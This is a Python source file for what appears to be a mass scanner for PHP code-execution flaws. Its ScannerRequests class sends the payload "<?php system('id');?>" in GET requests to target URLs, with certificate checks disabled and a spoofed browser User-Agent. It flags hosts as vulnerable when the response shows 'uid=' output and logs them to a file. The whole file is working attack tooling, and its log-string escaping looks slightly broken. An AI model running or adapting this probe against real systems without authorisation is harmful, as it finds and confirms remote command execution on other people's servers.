import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning 
urllib3.disable_warnings(InsecureRequestWarning)
from modules.file_module import file_moduler


class ScannerRequests:
    def __init__(self):
        self.headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like)"}
        self.timeout = 10
        self.payload = "<?php system('id');?>"
        self.logger = file_moduler()
        


    def send_requests(self, url):
        try:
            print(f"=> {url}")
            response = requests.get(url, verify=False, headers=self.headers, timeout=self.timeout, data=self.payload)
            if "uid=" in response.text or "gid=" in response.text or "groups=" in response.text:
                is_vulnerable = True
                self.logger_process(url, response.status_code, is_vulnerable)
            else:
                is_vulnerable = False
                self.logger_process(url, response.status_code, is_vulnerable)
        except (requests.exceptions.Timeout, requests.exceptions.HTTPError) as e:
            print(f"[X] something went wrong {e}")

    def logger_process(self, target, result, is_vulnerable):
        if result == 200 and is_vulnerable:
            save_value = f"\[VULNERABLE]{target}\",\"{result}\"\n"
            print(f"[*] VULNERABLE: {target}:{result}")
            self.logger.save_value_file(save_value, 'output.log')
        else:
            save_value = f"\[ERROR]{target}\",\"{result}\"\n"
            print(f"[X] {target}:{result}")
            self.logger.save_value_file(save_value, 'error.log')


            